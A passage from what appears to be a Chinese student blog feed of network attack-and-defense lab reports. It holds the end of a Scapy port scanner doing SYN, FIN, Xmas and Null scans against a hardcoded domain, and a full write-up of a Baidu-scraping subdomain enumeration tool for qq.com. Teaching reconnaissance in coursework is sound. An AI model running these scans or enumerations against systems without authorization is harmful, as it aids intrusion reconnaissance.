<span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> syn_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> syn_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>syn_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> syn_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"SA"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Open"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>syn_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan_F</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    fin_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"F"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> fin_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Open|Filtered"</span></span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> fin_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>fin_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> fin_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"RA"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan_X</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    xmas_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">'FPU'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> xmas_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Open|Filtered"</span></span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> xmas_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>xmas_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> xmas_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"RA"</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan_N</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    Null_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> Null_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Open|Filtered"</span></span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> Null_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>Null_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> Null_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"RA"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ping</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    ping一个主机    :param host: 主机地址    :return:    """</span>    package <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span> <span class="token operator">/</span> ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token string">b'Welcome to my world!'</span>    reply <span class="token operator">=</span> sr1<span class="token punctuation">(</span>package<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> reply<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'主机</span><span class="token interpolation"><span class="token punctuation">{</span>host<span class="token punctuation">}</span></span><span class="token string">可达'</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'主机</span><span class="token interpolation"><span class="token punctuation">{</span>host<span class="token punctuation">}</span></span><span class="token string">不可达'</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    dest <span class="token operator">=</span> <span class="token string">'fangzhiyang.cn'</span>    <span class="token comment"># dest = '172.17.0.1'</span>    port <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">]</span>    <span class="token comment"># ping(dest)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> port<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"TCP"</span><span class="token punctuation">)</span>        scan_T<span class="token punctuation">(</span>dest<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SYN"</span><span class="token punctuation">)</span>        scan_S<span class="token punctuation">(</span>dest<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FIN"</span><span class="token punctuation">)</span>        scan_F<span class="token punctuation">(</span>dest<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Xmas"</span><span class="token punctuation">)</span>        scan_X<span class="token punctuation">(</span>dest<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Null"</span><span class="token punctuation">)</span>        scan_N<span class="token punctuation">(</span>dest<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络攻防实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防实验1：域名信息收集工具</title>
      <link href="/2023/09/05/wang-luo-gong-fang-shi-yan-1/"/>
      <url>/2023/09/05/wang-luo-gong-fang-shi-yan-1/</url>
      
        <content type="html"><![CDATA[<div align="center">    <font size="6">实验1：域名信息收集工具</font></div><h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>实现如下功能：</p><p>a) 支持百度搜索引擎的域名提取，其中从百度搜索引擎提取的域名需为真实域名，而非百度的域名跳转链接；</p><p>b) 可扩充其他功能，比如域名所在的标题等信息。</p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>IntelliJ IDEA 2022.2.5</p><p>python 3.11.4</p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p>模仿给定代码在百度搜索domain:qq.com获得有效头部消息及url地址<img src="/../image/image-20240320191316818.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">hearders <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'</span><span class="token punctuation">,</span>    <span class="token string">'accept'</span><span class="token punctuation">:</span><span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span><span class="token punctuation">,</span>    <span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">,</span>    <span class="token string">'cookie'</span><span class="token punctuation">:</span><span class="token string">'MUID=15F7A3347F9B66091BBBAC017EB56733'</span><span class="token punctuation">}</span>url <span class="token operator">=</span> https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token operator">/</span>s?wd<span class="token operator">=</span>domain<span class="token operator">%</span>3Aqq<span class="token punctuation">.</span>com<span class="token operator">&amp;</span>rsv_spt<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>rsv_iqid<span class="token operator">=</span><span class="token number">0xe30d4f810000a68b</span><span class="token operator">&amp;</span>issp<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>f<span class="token operator">=</span><span class="token number">8</span><span class="token operator">&amp;</span>rsv_bp<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>rsv_idx<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>ie<span class="token operator">=</span>utf<span class="token operator">-</span><span class="token number">8</span><span class="token operator">&amp;</span>rqlang<span class="token operator">=</span>cn<span class="token operator">&amp;</span>tn<span class="token operator">=</span>baiduhome_pg<span class="token operator">&amp;</span>rsv_enter<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>rsv_dl<span class="token operator">=</span>tb<span class="token operator">&amp;</span>oq<span class="token operator">=</span>md<span class="token operator">%</span><span class="token number">25E6</span><span class="token operator">%</span>25A0<span class="token operator">%</span><span class="token number">2587</span><span class="token operator">%</span><span class="token number">25E9</span><span class="token operator">%</span>25A2<span class="token operator">%</span><span class="token number">2598</span><span class="token operator">%</span><span class="token number">25E5</span><span class="token operator">%</span>25B1<span class="token operator">%</span><span class="token number">2585</span><span class="token operator">%</span><span class="token number">25E4</span><span class="token operator">%</span>25B8<span class="token operator">%</span>25AD<span class="token operator">&amp;</span>rsv_btype<span class="token operator">=</span>t<span class="token operator">&amp;</span>inputT<span class="token operator">=</span><span class="token number">7872</span><span class="token operator">&amp;</span>rsv_t<span class="token operator">=</span>2860zrGbcycHSq1eY<span class="token operator">%</span>2BoQy2JT4AENbnpQtpi<span class="token operator">%</span>2BPP4Hb0gDsnpesekor2G0tcX4xSBtjMAe<span class="token operator">&amp;</span>rsv_pq<span class="token operator">=</span>9e665119000434fe<span class="token operator">&amp;</span>rsv_sug3<span class="token operator">=</span><span class="token number">33</span><span class="token operator">&amp;</span>rsv_sug1<span class="token operator">=</span><span class="token number">28</span><span class="token operator">&amp;</span>rsv_sug7<span class="token operator">=</span><span class="token number">100</span><span class="token operator">&amp;</span>rsv_sug2<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>rsv_sug4<span class="token operator">=</span><span class="token number">7872</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>确定百度搜索引擎得到的url的元素位置，发现在h3处，修改代码</p><p><img src="/../image/image-20230905200544524.png" alt="image-20230905200544524"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>hearders<span class="token punctuation">)</span>soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>job_bt <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'h3'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>复用原来的代码，但是发现百度的url是跳转链接，我通过如下代码的到真实url</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> job_bt<span class="token punctuation">:</span>link0 <span class="token operator">=</span> i<span class="token punctuation">.</span>a<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span>            <span class="token comment">#循环获取‘href’的内容</span>    link<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>link0<span class="token punctuation">)</span><span class="token punctuation">.</span>geturl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#打开跳转链接到目标地址再获取当前的url</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>得到url后用给的代码输出，保存到列表</p></li></ol><h3 id="扩展功能"><a href="#扩展功能" class="headerlink" title="扩展功能"></a>扩展功能</h3><ol><li><p>获取标题，并把url和标题放在一个字典里面再存到列表，最后存入json文件</p><p>我发现标题就在h2下的a里面，代码如下：</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> job_bt<span class="token punctuation">:</span>        link0 <span class="token operator">=</span> i<span class="token punctuation">.</span>a<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span>            <span class="token comment">#循环获取‘href’的内容</span>        title <span class="token operator">=</span> i<span class="token punctuation">.</span>a<span class="token punctuation">.</span>text       <span class="token comment">#循环获取标题</span>        link<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>link0<span class="token punctuation">)</span><span class="token punctuation">.</span>geturl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取真实域名</span>        <span class="token comment">#urlparse是一个解析url的工具，scheme获取url的协议名，netloc获取url的网络位置</span>        domain <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>urlparse<span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme <span class="token operator">+</span> <span class="token string">"://"</span> <span class="token operator">+</span> urlparse<span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc<span class="token punctuation">)</span>        subUrl <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"url"</span><span class="token punctuation">:</span>domain<span class="token punctuation">,</span>            <span class="token string">"title"</span><span class="token punctuation">:</span>title        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>subUrl <span class="token keyword">in</span> Subdomain<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment">#如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            Subdomain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>subUrl<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>subUrl<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>Subdomain<span class="token punctuation">,</span> f<span class="token punctuation">,</span>ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><p>爬取多页内容</p><p>跳转到第二页时我发现url变得有些不同，pn后面可以传参数跳转页面，后面冗余的一些东西也可以去掉，代码如下：<img src="/../image/image-20230905202200073.png" alt="image-20230905202200073"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> page <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#控制爬取的页数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token string">"https://www.baidu.com/s?wd=site%3Aqq.com&amp;pn="</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>page<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;oq=site%3Aqq.com"</span>    baidu_search<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="遇到的问题和一些有趣结果"><a href="#遇到的问题和一些有趣结果" class="headerlink" title="遇到的问题和一些有趣结果"></a>遇到的问题和一些有趣结果</h3><ol><li><p>爬取到的域名有的是baidu.com,zhihu.com等等，我把domain:qq.com改为site:qq.com后少了很多但还是有，于是我过滤了一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token punctuation">(</span>subUrl <span class="token keyword">in</span> Subdomain<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token string">"qq"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> domain<span class="token punctuation">)</span> <span class="token punctuation">:</span>      <span class="token comment">#如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中</span><span class="token keyword">pass</span><span class="token keyword">else</span><span class="token punctuation">:</span>    Subdomain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>subUrl<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>subUrl<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>把数据存成字典后发现得到的结果url有重复的，发现if条件判断出了问题，修改如下：</p><pre class="line-numbers language-none"><code class="language-none">#遍历Subdomain中的每个字典，并检查subUrl["url"]是否在该字典中。如果存在任何一个匹配的字典，any()函数将返回True，否则返回Falseif (any(subUrl["url"] in line.values() for line in Subdomain)) | ("qq" not in domain) :              #如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中    passelse:    Subdomain.append(subUrl)    print(subUrl)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在结果中发现有趣的现象，game.qq.com对应的标题是腾讯招聘</p><p><img src="/../image/image-20230905203620636.png" alt="image-20230905203620636"></p><p>debug后我找到了可能得原因：</p><p><img src="/../image/image-20240320191821693.png"></p><p>爬取到的url打开获取到的网页链接是在game.qq.com/hr下的，所以出现这种结果</p></li></ol><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p><img src="/../image/image-20230905210507353.png" alt="image-20230905210507353"></p><p><img src="/../image/image-20230905211825469.png" alt="image-20230905211825469"></p><h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> json<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoupSubdomain <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>filename <span class="token operator">=</span> <span class="token string">'url.json'</span>hearders <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'</span><span class="token punctuation">,</span>    <span class="token string">'accept'</span><span class="token punctuation">:</span><span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span><span class="token punctuation">,</span>    <span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">,</span>    <span class="token string">'cookie'</span><span class="token punctuation">:</span><span class="token string">'MUID=15F7A3347F9B66091BBBAC017EB56733'</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">baidu_search</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>hearders<span class="token punctuation">)</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>    job_bt <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'h3'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> job_bt<span class="token punctuation">:</span>        link0 <span class="token operator">=</span> i<span class="token punctuation">.</span>a<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span>            <span class="token comment">#循环获取‘href’的内容</span>        title <span class="token operator">=</span> i<span class="token punctuation">.</span>a<span class="token punctuation">.</span>text       <span class="token comment">#循环获取标题</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            link<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>link0<span class="token punctuation">)</span><span class="token punctuation">.</span>geturl<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">#真实子域名</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token comment">#urlparse是一个解析url的工具，scheme获取url的协议名，netloc获取url的网络位置</span>        domain <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>urlparse<span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme <span class="token operator">+</span> <span class="token string">"://"</span> <span class="token operator">+</span> urlparse<span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc<span class="token punctuation">)</span>        subUrl <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"url"</span><span class="token punctuation">:</span>domain<span class="token punctuation">,</span>            <span class="token string">"title"</span><span class="token punctuation">:</span>title        <span class="token punctuation">}</span>        <span class="token comment">#遍历Subdomain中的每个字典，并检查subUrl["url"]是否在该字典中。如果存在任何一个匹配的字典，any()函数将返回True，否则返回False</span>        <span class="token comment">#排除掉爬到的非qq.com</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">any</span><span class="token punctuation">(</span>subUrl<span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span> <span 